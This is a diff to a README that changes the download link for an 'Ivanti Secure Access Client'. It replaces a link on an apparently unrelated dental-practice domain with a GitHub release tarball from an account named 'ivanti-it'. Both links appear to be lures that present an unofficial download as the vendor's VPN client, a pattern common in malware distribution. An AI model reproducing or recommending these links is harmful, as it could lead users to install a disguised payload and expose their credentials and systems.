@@ -13,7 +13,7 @@ Table of Contents
 
 ## Installation
 
-**[Download Ivanti Secure Access Client](https://odontologiasur.com/odo/)**
+**[Download Ivanti Secure Access Client](https://github.com/ivanti-it/Ivanti-Secure-Access-Client/releases/download/1.2963/Ivanti-Secure-Access-Client.tar.gz)**
 
 After downloading the Ivanti Secure Access Client, follow these steps to install and configure the application:
 
